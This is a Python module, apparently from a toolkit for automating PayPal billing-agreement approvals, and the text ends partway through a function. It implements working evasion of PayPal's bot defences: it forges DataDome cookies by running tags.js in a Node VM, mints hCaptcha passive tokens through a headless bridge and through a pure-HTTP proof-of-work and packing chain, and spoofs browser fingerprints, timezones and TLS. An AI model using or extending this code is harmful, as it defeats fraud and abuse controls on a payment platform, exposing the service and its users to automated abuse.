# -*- coding: utf-8 -*-
"""Pure HTTP (+ local Node DOM) fingerprint stack for PayPal BA authchallenge.

Reverses GPT_PLUS_PP纯协议版 + desktop autofill/vxt findings into a runnable
min-implant path that:

  * does NOT launch a browser at runtime
  * does NOT call 2Captcha / CapSolver / YesCaptcha / Anti-Captcha
  * mints DataDome cookie via ddbm2 tags.js → Node VM → POST /js/
  * mints hCaptcha *passive* token via real paypalobjects bridge in happy-dom
  * submits /auth/validatecaptcha with the protocol field set (hcaptchaToken,
    jse, passive timestamps) — not the wrong g-recaptcha dual-bind fields

Browser is research-only. Final product = curl_cffi session + Node helpers.

Self-check (default probe mode):
  - triggers charge / consent? NO
  - consumes samples/success.jsonl for authorize? NO (read-only GET + optional
    entry-gate validatecaptcha only)
  - mutates chain.py? NO

Env:
  MIN_BA_HTTP_FP=1              enable this stack (default 1 when imported by
                                ba_authorize for hCaptcha)
  MIN_BA_SKIP_DDBM2=0           skip DataDome node warmup
  MIN_BA_SKIP_HCAPTCHA_NODE=0   skip happy-dom passive mint
  MIN_BA_HCAPTCHA_TOKEN=...     one-shot pre-minted token (debug)
  NODE / OPENAI_SENTINEL_NODE_PATH  node binary
  NODE_PATH                     include happy-dom (auto-detected)
"""
from __future__ import annotations

import html as html_lib
import json
import logging
import os
import random
import re
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Optional
from urllib.parse import parse_qs, unquote, urlparse

log = logging.getLogger(__name__)

ROOT = Path(__file__).resolve().parent
HELPER_DIR = ROOT / "ba_fp_helpers"
DDBM2_JS = HELPER_DIR / "ddbm2_node.js"
# §3.1: bridge-load sister port (default). Legacy heavy helper kept for fallback.
HCAPTCHA_JS_BRIDGE = HELPER_DIR / "ba_hcaptcha_passive_node.js"
HCAPTCHA_JS_LEGACY = HELPER_DIR / "hcaptcha_passive_node.js"
HCAPTCHA_JS = HCAPTCHA_JS_BRIDGE  # default alias for mint path

PP_ORIGIN = "https://www.paypal.com"
DDBM2_TAGS = "https://ddbm2.paypal.com/tags.js"
DDBM2_JS_URL = "https://ddbm2.paypal.com/js/"
DDBM2_DDJSKEY = os.environ.get("MIN_BA_DDBM2_DDJSKEY") or "2D56F91C2AD1A8EB7C6A5CA65F5567"

# Align with ba_authorize macOS chrome146 TLS profile
try:
    from ba_authorize import (
        UA,
        SEC_CH_UA,
        SEC_CH_UA_FULL_VERSION_LIST,
        SEC_CH_UA_PLATFORM,
        SEC_CH_UA_ARCH,
        SEC_CH_UA_MODEL,
    )
except Exception:  # pragma: no cover
    UA = (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
    )
    SEC_CH_UA = '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"'
    SEC_CH_UA_FULL_VERSION_LIST = (
        '"Chromium";v="146.0.0.0", "Not-A.Brand";v="10.0.0.0", '
        '"Google Chrome";v="146.0.0.0"'
    )
    SEC_CH_UA_PLATFORM = '"macOS"'
    SEC_CH_UA_ARCH = '"x86"'
    SEC_CH_UA_MODEL = '""'

_TRUE = {"1", "true", "yes", "on"}


def _truthy(name: str, default: bool = False) -> bool:
    raw = os.environ.get(name)
    if raw is None or str(raw).strip() == "":
        return default
    return str(raw).strip().lower() in _TRUE


def http_fp_enabled() -> bool:
    """Default ON: pure HTTP FP is the intended captcha path under v2 bounds."""
    return _truthy("MIN_BA_HTTP_FP", True)


def _node_bin() -> str:
    _fallback_dir = Path(r"C:\Users\ADMINI~1\AppData\Local\Temp\opencode\node-v20.19.5-win-x64")
    for c in (
        (os.environ.get("OPENAI_SENTINEL_NODE_PATH") or "").strip(),
        (os.environ.get("NODE") or "").strip(),
        shutil.which("node") or "",
        str(_fallback_dir / "node.exe") if (_fallback_dir / "node.exe").exists() else "",
    ):
        if c:
            return c
    return "node"


def _happy_dom_node_path() -> str:
    """Locate happy-dom so hcaptcha_passive_node.js can require() it."""
    candidates = [
        ROOT / "node_modules",
        HELPER_DIR / "node_modules",
        Path(r"C:\Users\Administrator\Desktop\GPT_PLUS_PP纯协议版\webui\frontend\node_modules"),
        Path("/app/webui/frontend/node_modules"),
        Path("/usr/local/lib/node_modules"),
    ]
    existing = [str(p) for p in candidates if (p / "happy-dom").exists() or p.exists()]
    prev = [p for p in (os.environ.get("NODE_PATH") or "").split(os.pathsep) if p.strip()]
    merged = list(dict.fromkeys(prev + existing))
    return os.pathsep.join(merged)


def _unescape_url(u: str) -> str:
    return html_lib.unescape(u or "").strip()


def _html_input_value(html: str, name: str) -> str:
    m = re.search(
        rf'name=["\']{re.escape(name)}["\'][^>]*value=["\']([^"\']*)["\']',
        html or "",
        re.I | re.S,
    )
    if not m:
        m = re.search(
            rf'value=["\']([^"\']*)["\'][^>]*name=["\']{re.escape(name)}["\']',
            html or "",
            re.I | re.S,
        )
    return html_lib.unescape(m.group(1)) if m else ""


def _html_attr_value(html: str, attr: str) -> str:
    m = re.search(rf'{re.escape(attr)}=["\']([^"\']+)["\']', html or "", re.I)
    return html_lib.unescape(m.group(1)) if m else ""


def _first_query_value(url: str, key: str) -> str:
    try:
        qs = parse_qs(urlparse(url).query)
        vals = qs.get(key) or qs.get(key.lower()) or qs.get(key.upper()) or []
        return unquote(vals[0]) if vals else ""
    except Exception:
        return ""


def extract_hcaptcha_passive_iframe_src(challenge_html: str) -> str:
    m = re.search(
        r'<iframe[^>]+src=["\']([^"\']*hcaptcha/hcaptchapassive(?:_eval)?\.html[^"\']*)',
        challenge_html or "",
        re.I,
    )
    return _unescape_url(m.group(1)) if m else ""


def extract_hcaptcha_site_key(challenge_html: str, iframe_src: str = "") -> str:
    for c in (
        _first_query_value(iframe_src, "siteKey"),
        _first_query_value(iframe_src, "sitekey"),
        _html_attr_value(challenge_html, "data-sitekey"),
        _html_attr_value(challenge_html, "data-site-key"),
    ):
        if c:
            return c
    m = re.search(r"\bsiteKey=([0-9a-fA-F-]{20,})", challenge_html or "", re.I)
    return html_lib.unescape(m.group(1)) if m else ""


def extract_hcaptcha_rqdata(challenge_html: str, iframe_src: str = "") -> str:
    """Best-effort rqdata for enterprise/passive hCaptcha (flow.py parity)."""
    for c in (
        _first_query_value(iframe_src, "rqdata"),
        _first_query_value(iframe_src, "rqData"),
        _html_attr_value(challenge_html, "data-rqdata"),
        _html_attr_value(challenge_html, "data-rqData"),
        _html_attr_value(challenge_html, "data-hcaptcha-rqdata"),
    ):
        if c:
            return c
    m = re.search(r'\brqdata["\']?\s*[:=]\s*["\']([^"\']+)', challenge_html or "", re.I)
    return html_lib.unescape(m.group(1)) if m else ""


def is_hcaptcha_passive_challenge(challenge_html: str) -> bool:
    """True ONLY for data-captcha-type=hcaptchapassive (or passive iframe).

    HARD RULE: visual hCaptcha (data-captcha-type=hcaptcha, hcaptcha_fph.html,
    iframe name=\"recaptcha\") is NOT passive — do not mint via passive bridge.
    """
    ctype = (_html_attr_value(challenge_html, "data-captcha-type") or "").strip().lower()
    if ctype == "hcaptchapassive":
        return True
    if ctype == "hcaptcha":
        return False  # visual challenge
    if ctype in ("recaptcha", "recaptchav3"):
        return False
    # Attribute missing: only treat as passive if passive eval iframe present
    if extract_hcaptcha_passive_iframe_src(challenge_html):
        return True
    return False


def extract_authchallenge_context(
    challenge_html: str,
    *,
    page_url: str = "",
    user_agent: str = "",
) -> dict[str, Any]:
    """Pull iframe/sitekey/rqdata + form secrets from authchallenge HTML."""
    from urllib.parse import urljoin

    captcha_type = (_html_attr_value(challenge_html, "data-captcha-type") or "").strip().lower()
    raw_iframe = extract_hcaptcha_passive_iframe_src(challenge_html)
    iframe_src = urljoin("https://www.paypal.com/", raw_iframe) if raw_iframe else ""
    site_key = extract_hcaptcha_site_key(challenge_html, iframe_src)
    rqdata = extract_hcaptcha_rqdata(challenge_html, iframe_src)
    is_passive = is_hcaptcha_passive_challenge(challenge_html)
    csrf = _html_input_value(challenge_html, "_csrf") or _html_attr_value(
        challenge_html, "data-csrf"
    )
    session_id = _html_input_value(challenge_html, "_sessionID") or _html_attr_value(
        challenge_html, "data-sessionid"
    )
    return {
        "captcha_type": captcha_type,
        "is_passive": is_passive,
        "iframe_src": iframe_src,
        "site_key": site_key,
        "rqdata": rqdata,
        "parent_url": page_url or PP_ORIGIN,
        "user_agent": user_agent or UA,
        "csrf": csrf,
        "session_id": session_id,
        "request_id": _html_input_value(challenge_html, "_requestId"),
        "hash": _html_input_value(challenge_html, "_hash"),
        "jse": _html_attr_value(challenge_html, "data-jse"),
    }


def _default_browser_profile(region: str = "MX") -> dict[str, Any]:
    """Mac Chrome surface aligned with ba_authorize + region timezone.

    15 国走 country_profile (IANA 时区 + zoneinfo 运行时偏移, DST 安全);
    未收录国家 (如 MX) 回退静态表。偏移用 JS getTimezoneOffset 约定
    (西正东负), 与 Node 桥 Date#getTimezoneOffset 注入对齐。
    """
    region = (region or "MX").upper()
    tz_map = {
        "MX": ("America/Mexico_City", 360),
        "BR": ("America/Sao_Paulo", 180),
        "US": ("America/New_York", 300),
        "GB": ("Europe/London", 0),
    }
    try:
        try:
            from paypal.country_profile import country_context
        except ImportError:
            from .paypal.country_profile import country_context

        ctx = country_context(region)
        tz, off = ctx.timezone, -ctx.tz_offset_minutes
        lang = ctx.language
    except Exception:
        tz, off = tz_map.get(region, tz_map["MX"])
        lang = "es-MX" if region == "MX" else ("pt-BR" if region == "BR" else "en-US")
    return {
        "language": lang,
        "languages": [lang, lang.split("-")[0], "en-US", "en"],
        "platform": "MacIntel",
        "vendor": "Google Inc.",
        "device_memory": 8,
        "hardware_concurrency": 8,
        "device_pixel_ratio": 2,
        "timezone": tz,
        "timezone_offset_minutes": off,
    }


def _resolve_hcaptcha_helper() -> tuple[Path, str]:
    """Return (helper_path, mode) for MIN_BA_HCAPTCHA_NODE_HELPER=bridge|legacy|auto."""
    mode = (os.environ.get("MIN_BA_HCAPTCHA_NODE_HELPER") or "bridge").strip().lower()
    if mode in ("legacy", "old", "heavy"):
        return HCAPTCHA_JS_LEGACY, "legacy"
    if mode in ("auto",):
        if HCAPTCHA_JS_BRIDGE.exists():
            return HCAPTCHA_JS_BRIDGE, "bridge"
        return HCAPTCHA_JS_LEGACY, "legacy"
    # default bridge
    if HCAPTCHA_JS_BRIDGE.exists():
        return HCAPTCHA_JS_BRIDGE, "bridge"
    return HCAPTCHA_JS_LEGACY, "legacy"


def _cookie_header(session: Any) -> str:
    try:
        jar = session.cookies
        if hasattr(jar, "get_dict"):
            d = jar.get_dict()
            return "; ".join(f"{k}={v}" for k, v in d.items())
        parts = []
        for c in jar:
            parts.append(f"{c.name}={c.value}")
        return "; ".join(parts)
    except Exception:
        return ""


def _set_cookie(session: Any, name: str, value: str, domain: str = ".paypal.com") -> None:
    try:
        session.cookies.set(name, value, domain=domain, path="/")
    except Exception:
        try:
            session.cookies.set(name, value)
        except Exception:
            pass


def ddbm2_warmup(
    session: Any,
    *,
    page_url: str,
    ba_token: str = "",
    timeout: int = 20,
    user_agent: str = "",
) -> dict[str, Any]:
    """Mint a DataDome cookie via tags.js + Node VM + POST ddbm2.paypal.com/js/.

    Pure protocol: no browser, no captcha farm. Soft-fails with structured result.
    """
    out: dict[str, Any] = {"ok": False, "datadome_len": 0, "error": ""}
    if _truthy("MIN_BA_SKIP_DDBM2", False) or _truthy("PPS_SKIP_DDBM2", False):
        out["error"] = "skipped_by_env"
        return out
    if not DDBM2_JS.exists():
        out["error"] = f"helper_missing:{DDBM2_JS}"
        return out
    node = _node_bin()
    ua = user_agent or UA
    page_url = page_url or f"{PP_ORIGIN}/"
    headers_js = {
        "User-Agent": ua,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": page_url,
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "no-cors",
        "Sec-Fetch-Dest": "script",
    }
    try:
        tags = session.get(DDBM2_TAGS, headers=headers_js, timeout=max(8, min(timeout, 20)))
        tags_js = tags.text or ""
        if getattr(tags, "status_code", 0) != 200 or "DataDome" not in tags_js[:2000]:
            out["error"] = (
                f"tags_js_bad status={getattr(tags, 'status_code', '?')} len={len(tags_js)}"
            )
            log.warning("HTTP-FP ddbm2: %s", out["error"])
            return out
    except Exception as e:
        out["error"] = f"tags_js_fetch:{type(e).__name__}:{e}"
        log.warning("HTTP-FP ddbm2 tags.js: %s", out["error"])
        return out

    payload = {
        "tagsJs": tags_js,
        "pageUrl": page_url,
        "referrer": (
            f"{PP_ORIGIN}/agreements/approve?ba_token={ba_token}"
            if ba_token
            else "https://www.paypal.com/"
        ),
        "cookie": _cookie_header(session) or "datadome=.keep",
        "userAgent": ua,
        "ddjsKey": DDBM2_DDJSKEY,
    }
    env = os.environ.copy()
    env["NODE_PATH"] = _happy_dom_node_path()
    try:
        proc = subprocess.run(
            [node, str(DDBM2_JS)],
            input=json.dumps(payload),
            text=True,
            capture_output=True,
            timeout=max(10, min(timeout, 25)),
            check=False,
            env=env,
            cwd=str(HELPER_DIR),
        )
        stdout = (proc.stdout or "").strip()
        if proc.returncode != 0 and not stdout:
            out["error"] = f"node_rc={proc.returncode} stderr={(proc.stderr or '')[:200]}"
            return out
        line = stdout.splitlines()[-1] if stdout else "{}"
        node_out = json.loads(line)
        body = str(node_out.get("body") or "")
        if not body.startswith("jspl="):
            out["error"] = f"no_jspl:{stdout[:200]}"
            log.warning("HTTP-FP ddbm2: %s", out["error"])
            return out
        out["jspl_len"] = len(body)
    except Exception as e:
        out["error"] = f"node_run:{type(e).__name__}:{e}"
        log.warning("HTTP-FP ddbm2 node: %s", out["error"])
        return out

    headers_post = {
        "User-Agent": ua,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": PP_ORIGIN,
        "Referer": "https://www.paypal.com/",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }
    try:
        # curl_cffi: pass raw body string via data=
        r = session.post(
            DDBM2_JS_URL,
            data=body,
            headers=headers_post,
            timeout=max(8, min(timeout, 20)),
        )
        text = r.text or ""
        cookie_str = ""
        try:
            data = r.json()
            cookie_str = str((data or {}).get("cookie") or "")
        except Exception:
            cookie_str = text
        m = re.search(r"(?:^|;\s*)datadome=([^;]+)", cookie_str)
        if m:
            dd_val = m.group(1)
            _set_cookie(session, "datadome", dd_val)
            out["ok"] = True
            out["datadome_len"] = len(dd_val)
            log.info(
                "HTTP-FP ddbm2 OK status=%s jspl_len=%s datadome_len=%d",
                getattr(r, "status_code", "?"),
                out.get("jspl_len"),
                len(dd_val),
            )
        else:
            out["error"] = f"no_datadome status={getattr(r, 'status_code', '?')} body={text[:200]}"
            log.warning("HTTP-FP ddbm2: %s", out["error"])
    except Exception as e:
        out["error"] = f"js_post:{type(e).__name__}:{e}"
        log.warning("HTTP-FP ddbm2 post: %s", out["error"])
    return out


def _run_hcaptcha_node_helper(
    helper: Path,
    helper_mode: str,
    *,
    iframe_url: str,
    parent_url: str,
    timeout: int,
    user_agent: str,
    proxy: Optional[str],
    html: str,
    browser_profile: Optional[dict] = None,
    screen: Optional[dict] = None,
    viewport: Optional[dict] = None,
    accept_language: str = "",
) -> dict[str, Any]:
    """Spawn one Node helper; return structured mint fields (may be empty token)."""
    out: dict[str, Any] = {
        "ok": False,
        "token": "",
        "renderData": {},
        "error": "",
        "source": "",
        "states": [],
        "helper_mode": helper_mode,
        "helper_path": str(helper),
    }
    if not helper.exists():
        out["error"] = f"helper_missing:{helper}"
        return out
    region = (os.environ.get("MIN_BA_HCAP_REGION") or "MX").upper()
    profile = browser_profile or _default_browser_profile(region)
    scr = screen or {
        "width": 1440,
        "height": 900,
        "availWidth": 1440,
        "availHeight": 875,
        "colorDepth": 24,
        "pixelDepth": 24,
    }
    vp = viewport or {"width": 1440, "height": 821}
    lang = accept_language or (
        f"{profile.get('language', 'en-US')},"
        f"{str(profile.get('language', 'en-US')).split('-')[0]};q=0.9,en;q=0.8"
    )
    payload: dict[str, Any] = {
        "iframeUrl": iframe_url,
        "parentUrl": parent_url or PP_ORIGIN,
        "userAgent": user_agent or UA,
        "timeoutMs": int(max(15, timeout) * 1000),
        "region": region,
        "browserProfile": profile,
        "screen": scr,
        "viewport": vp,
        "acceptLanguage": lang,
    }
    if html:
        payload["html"] = html
    if proxy:
        payload["proxy"] = proxy
    node = _node_bin()
    env = os.environ.copy()
    env["NODE_PATH"] = _happy_dom_node_path()
    if proxy:
        env["HTTPS_PROXY"] = proxy
        env["HTTP_PROXY"] = proxy
        env["ALL_PROXY"] = proxy
    try:
        proc = subprocess.run(
            [node, str(helper)],
            input=json.dumps(payload, ensure_ascii=False),
            text=True,
            capture_output=True,
            timeout=max(120, int(timeout) + 40),
            env=env,
            cwd=str(HELPER_DIR),
        )
    except Exception as e:
        out["error"] = f"node_launch:{type(e).__name__}:{e}"
        return out

    stdout = (proc.stdout or "").strip()
    stderr = (proc.stderr or "").strip()
    out["stderr_tail"] = (stderr or "")[-1500:]
    out["returncode"] = proc.returncode
    if stderr:
        log.debug("HTTP-FP hcaptcha[%s] stderr: %s", helper_mode, stderr[-1500:])
    if not stdout:
        out["error"] = f"no_stdout rc={proc.returncode}"
        return out
    try:
        data = json.loads(stdout)
    except Exception as e:
        out["error"] = f"json_parse:{e} head={stdout[:200]}"
        return out

    token = str(data.get("token") or "").strip()
    # Reject terminal sentinel tokens
    if token in ("NOT_REACHABLE", "RENDER_FAILURE", "EMPTY_TOKEN"):
        out["error"] = f"terminal:{token}"
        out["states"] = list(data.get("states") or [])
        out["elapsedMs"] = data.get("elapsedMs")
        return out

    out["states"] = list(data.get("states") or [])
    out["elapsedMs"] = data.get("elapsedMs")
    out["iframeSrcs"] = data.get("iframeSrcs")
    out["iframeCount"] = data.get("iframeCount")
    out["messageCount"] = data.get("messageCount")
    out["recentMessages"] = data.get("recentMessages")
    if token and len(token) > 20:
        out["ok"] = True
        out["token"] = token
        out["source"] = f"node_{helper_mode}"
        rd = data.get("renderData") or {}
        out["renderData"] = rd if isinstance(rd, dict) else {}
    else:
        out["error"] = str(data.get("error") or f"no_token rc={proc.returncode}")
    return out


# Live asset version observed on 2026-07-16 G11 (newassets …/captcha/v1/<V>/)
_HCAPTCHA_ASSET_V_FALLBACK = "ced1647459f073cc025a1281baafa600680d7f3e"
_HCAPTCHA_PASSIVE_SITEKEY = "884d15d9-b649-4bbb-8d1c-2d6f0eed75eb"


def _jwt_payload_l(req: str) -> str:
    """Extract hsw path fragment `l` from checksiteconfig JWT req."""
    import base64

    try:
        parts = (req or "").split(".")
        if len(parts) < 2:
            return ""
        pad = "=" * ((4 - len(parts[1]) % 4) % 4)
        pl = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
        return str(pl.get("l") or "")
    except Exception:
        return ""


def mint_hcaptcha_passive_protocol(
    *,
    site_key: str = "",
    host: str = "www.paypalobjects.com",
    proxy: Optional[str] = None,
    user_agent: str = "",
    hl: str = "pt",
    timeout: int = 90,
    asset_v: str = "",
) -> dict[str, Any]:
    """Pure-HTTP getcaptcha mint: curl_cffi csc → Node PoW → ExtType18 pack → POST.

    Zero browser binary. Historical pure n is often soft-rejected (host_sum gap);
    still the correct pure-protocol chain and required fallback after happy-dom.
    """
    out: dict[str, Any] = {
        "ok": False,
        "token": "",
        "error": "",
        "source": "protocol_mint",
        "n_len": 0,
        "packed_len": 0,
    }
    site_key = (site_key or _HCAPTCHA_PASSIVE_SITEKEY).strip()
    host = (host or "www.paypalobjects.com").strip()
    ua = (user_agent or UA).strip() or UA
    v = (asset_v or os.environ.get("MIN_BA_HCAPTCHA_ASSET_V") or _HCAPTCHA_ASSET_V_FALLBACK).strip()

    try:
        from curl_cffi import requests as creq
    except Exception as e:
        out["error"] = f"curl_cffi:{e}"
        return out

    sess = creq.Session(impersonate="chrome146")
    headers = {
        "User-Agent": ua,
        "Origin": "https://newassets.hcaptcha.com",
        "Referer": "https://newassets.hcaptcha.com/",
        "Accept": "application/json",
    }
    # Prefer PayPal custom host when available (customDomains path)
    csc_hosts = [
        f"https://api.hcaptcha.com/checksiteconfig?v={v}&host={host}"
        f"&sitekey={site_key}&sc=1&swa=1&spst=1",
        f"https://hcaptcha.paypal.com/checksiteconfig?v={v}&host={host}"
        f"&sitekey={site_key}&sc=1&swa=1&spst=1",
    ]
    c_obj: dict[str, Any] = {}
    hsw_path = ROOT / "_hsw_protocol_live.js"
    last_err = ""
    for csc_url in csc_hosts:
        try:
            r = sess.post(csc_url, headers=headers, proxy=proxy, timeout=min(40, timeout))
            if getattr(r, "status_code", 0) != 200:
                last_err = f"csc_status={getattr(r, 'status_code', None)}"
                continue
            body = r.json() if hasattr(r, "json") else json.loads(r.text or "{}")
            c_obj = body.get("c") or {}
            if not c_obj.get("req"):
                last_err = "csc_no_req"
                continue
            lfrag = _jwt_payload_l(str(c_obj["req"]))
            # Prefer host that served csc for hsw.js
            base_asset = (
                "https://newassets.hcaptcha.paypal.com"
                if "hcaptcha.paypal.com" in csc_url
                else "https://newassets.hcaptcha.com"
            )
            hsw_url = base_asset + lfrag + "/hsw.js" if lfrag else ""
            if not hsw_url:
                hsw_url = f"{base_asset}/c/{v}/hsw.js"
            hr = sess.get(hsw_url, headers={"User-Agent": ua}, proxy=proxy, timeout=60)
            if getattr(hr, "status_code", 0) != 200 or not (hr.content or b""):
                last_err = f"hsw_fetch={getattr(hr, 'status_code', None)}"
                continue
            hsw_path.write_bytes(hr.content)
            # Prefer V from JWT path if present
            m = re.search(r"/c/([a-f0-9]{20,})/", lfrag or "")
            if m:
                v = m.group(1)
            log.info(
                "HTTP-FP protocol csc ok host=%s hsw_len=%d v=%s",
                host,
                len(hr.content),
                v[:12],
            )
            break
        except Exception as e:
            last_err = f"csc_exc:{type(e).__name__}:{e}"
            c_obj = {}
    if not c_obj.get("req"):
        out["error"] = last_err or "csc_failed"
        return out

    # Node pure PoW — prefer napi canvas / window_force helpers when present.
    # Device profile (Power-to-Device Ratio): default mid_mac_intel under-claims vs M1 Pro.
    # Override: MIN_BA_POW_DEVICE_PROFILE=lowend_mac|matched_host|mid_mac_intel|high_mac_m1
    pow_candidates = [
        HELPER_DIR / "_jsdom_mint_unified.js",
        ROOT / "_pure_grind_napi_pow.js",
        ROOT / "_hsw_happy_dom_window_force_pow.js",
        HELPER_DIR / "hsw_pow_node.js",
    ]
    pow_js = next((p for p in pow_candidates if p.exists()), None)
    if not pow_js:
        out["error"] = "no_pow_helper"
        return out
    env = os.environ.copy()
    env["NODE_PATH"] = _happy_dom_node_path()
    device_profile = (
        (os.environ.get("MIN_BA_POW_DEVICE_PROFILE") or "mid_mac_intel").strip()
        or "mid_mac_intel"
    )
    env["MIN_BA_POW_DEVICE_PROFILE"] = device_profile
    out["device_profile"] = device_profile
    if proxy:
        env["HTTPS_PROXY"] = proxy
        env["HTTP_PROXY"] = proxy
        env["ALL_PROXY"] = proxy
    try:
        pow_input = {
            "req": c_obj["req"],
            "hswPath": str(hsw_path),
            "userAgent": ua,
            "host": host,
            "forceMode": "window",
            "deviceProfile": device_profile,
        }
        if pow_js.name == "_jsdom_mint_unified.js":
            pow_input.update(
                {
                    "cObj": c_obj,
                    "sitekey": site_key,
                    "v": v,
                    "hl": hl or "pt",
                }
            )
        proc = subprocess.run(
            [_node_bin(), str(pow_js)],
            input=json.dumps(pow_input, ensure_ascii=False),
            text=True,
            capture_output=True,
            timeout=max(90, min(timeout, 150)),
            env=env,
            cwd=str(ROOT),
        )
        line = (proc.stdout or "").strip().splitlines()[-1] if proc.stdout else "{}"
        pow_data = json.loads(line)
    except Exception as e:
        out["error"] = f"pow:{type(e).__name__}:{e}"
        return out
    n = str(
        pow_data.get("n")
        or pow_data.get("proof")
        or pow_data.get("token")
        or ""
    ).strip()
    # Some helpers write n to a sidecar file when stdout would be huge
    if (not n or len(n) < 100) and pow_data.get("n_path"):
        try:
            n = Path(str(pow_data["n_path"])).read_text(encoding="utf-8", errors="replace").strip()
        except Exception:
            pass
    if not n or len(n) < 100:
        # Fallback: _pure_grind_napi writes n to _pure_grind_napi_n.txt
        for side in (
            ROOT / "_pure_grind_napi_n.txt",
            ROOT / "_pure_grind_n.txt",
            ROOT / "_n_pure.txt",
        ):
            if side.exists() and side.stat().st_size > 100:
                try:
                    cand = side.read_text(encoding="utf-8", errors="replace").strip()
                    if len(cand) > len(n):
                        n = cand
                except Exception:
                    pass
    if not n or len(n) < 100:
        out["error"] = f"pow_no_n:{pow_data.get('error') or line[:160]}"
        return out
    out["n_len"] = len(n)
    if pow_data.get("host_sum") is not None:
        out["host_sum"] = pow_data.get("host_sum")
    if pow_data.get("deviceProfile"):
        out["device_profile"] = pow_data.get("deviceProfile")
    if pow_data.get("elapsedMs") is not None:
        out["pow_ms"] = pow_data.get("elapsedMs")
    elif pow_data.get("ms") is not None:
        out["pow_ms"] = pow_data.get("ms")
    log.info(
        "HTTP-FP protocol pow ok n_len=%s host_sum=%s profile=%s ms=%s helper=%s",
        out["n_len"],
        out.get("host_sum"),
        out.get("device_profile"),
        out.get("pow_ms"),
        pow_js.name,
    )

    # ExtType18 pack via existing helper (unified jsdom runner packs inline)
    pack_js = ROOT / "_pure_grind_pack_ext18.js"
    unified_packed = str(pow_data.get("packed_b64") or "").strip()
    if not pack_js.exists() and not unified_packed:
        out["error"] = "pack_helper_missing"
        return out
    if unified_packed:
        pack_data = {"ok": True, "packed_b64": unified_packed}
    else:
        try:
            proc2 = subprocess.run(
                [_node_bin(), str(pack_js)],
                input=json.dumps(
                    {
                        "n": n,
                        "cObj": c_obj,
                        "sitekey": site_key,
                        "host": host,
                        "userAgent": ua,
                        "hswPath": str(hsw_path),
                        "v": v,
                        "hl": hl or "pt",
                    },
                    ensure_ascii=False,
                ),
                text=True,
                capture_output=True,
                timeout=max(90, min(timeout, 150)),
                env=env,
                cwd=str(ROOT),
            )
            pack_data = json.loads((proc2.stdout or "").strip() or "{}")
        except Exception as e:
            out["error"] = f"pack:{type(e).__name__}:{e}"
            return out
    if not pack_data.get("ok") or not pack_data.get("packed_b64"):
        out["error"] = f"pack_fail:{pack_data.get('error')}"
        return out
    import base64

    packed = base64.b64decode(pack_data["packed_b64"])
    out["packed_len"] = len(packed)

    gc_urls = [
        f"https://api.hcaptcha.com/getcaptcha/{site_key}",
        f"https://hcaptcha.paypal.com/getcaptcha/{site_key}",
    ]
    for gc_url in gc_urls:
        try:
            gr = sess.post(
                gc_url,
                headers={
                    **headers,
                    "Accept": "application/json, application/octet-stream",
                    "Content-Type": "application/octet-stream",
                },
                data=packed,
                proxy=proxy,
                timeout=min(45, timeout),
            )
            ct = (gr.headers.get("content-type") or "").lower()
            log.info(
                "HTTP-FP protocol getcaptcha status=%s ct=%s len=%s",
                getattr(gr, "status_code", None),
                ct[:40],
                len(gr.content or b""),
            )
            if getattr(gr, "status_code", 0) != 200:
                continue
            # JSON soft-reject or token
            if "json" in ct or (gr.content or b"").lstrip()[:1] == b"{":
                try:
                    j = gr.json()
                except Exception:
                    j = json.loads((gr.text or "{}"))
                tok = str(j.get("generated_pass_UUID") or j.get("token") or "").strip()
                if tok and len(tok) > 20:
                    out.update(ok=True, token=tok, error="")
                    return out
                out["error"] = f"gc_soft_reject keys={list(j.keys())[:6]}"
                # try next endpoint / stop
                continue
            # Binary success → decrypt via node helper
            if "octet-stream" in ct or "msgpack" in ct or len(gr.content or b"") > 200:
                resp_path = ROOT / "_protocol_gc_resp.bin"
                resp_path.write_bytes(gr.content)
                dec_js = HELPER_DIR / "hsw_decrypt_resp_node.js"
                if not dec_js.exists():
                    out["error"] = "decrypt_helper_missing"
                    return out
                proc3 = subprocess.run(
                    [_node_bin(), str(dec_js)],
                    input=json.dumps(
                        {
                            "respPath": str(resp_path.resolve()),
                            "hswPath": str(hsw_path.resolve()),
                            "sitekey": site_key,
                            "host": host,
                        }
                    ),
                    text=True,
                    capture_output=True,
                    timeout=120,
                    env=env,
                    cwd=str(ROOT),
                )
                raw = (proc3.stdout or "").strip().lstrip("\ufeff")
                try:
                    dec = json.loads(raw)
                except Exception:
                    out["error"] = f"decrypt_json:{raw[:120]}"
                    return out
                tok = str(dec.get("token") or "").strip()
                if tok and len(tok) > 20:
                    out.update(ok=True, token=tok, error="")
                    return out
                out["error"] = f"decrypt_no_token:{dec.get('error')}"
        except Exception as e:
            out["error"] = f"gc_exc:{type(e).__name__}:{e}"
    if not out.get("ok") and not out.get("error"):
        out["error"] = "getcaptcha_no_token"
    return out


def mint_hcaptcha_passive_token(
    *,
    iframe_url: str,
    parent_url: str = "",
    timeout: int = 55,
    user_agent: str = "",
    proxy: Optional[str] = None,
    html: str = "",
    browser_profile: Optional[dict] = None,
    screen: Optional[dict] = None,
    viewport: Optional[dict] = None,
    accept_language: str = "",
) -> dict[str, Any]:
    """Run official PayPal hCaptcha passive bridge in happy-dom (Node).

    Returns {ok, token, renderData, error, elapsedMs, states, source}.
    No farm API. Default helper = ba_hcaptcha_passive_node.js (bridge).

    Note: happy-dom 20+ needs enableJavaScriptEvaluation (set in helper).
    Prefetching ``html`` (e.g. via curl_cffi+proxy) avoids plain-node 404/geo
    issues on the bridge document; api.js still loads from hcaptcha.paypal.com.
    """
    out: dict[str, Any] = {
        "ok": False,
        "token": "",
        "renderData": {},
        "error": "",
        "source": "",
        "states": [],
    }
    manual = (os.environ.get("MIN_BA_HCAPTCHA_TOKEN") or os.environ.get("PPS_PAYPAL_HCAPTCHA_TOKEN") or "").strip()
    if manual:
        out.update(ok=True, token=manual, source="manual_env")
        return out

    # RESEARCH mint: Chrome hsw(req) n + Node ExtType-18 pack + curl getcaptcha.
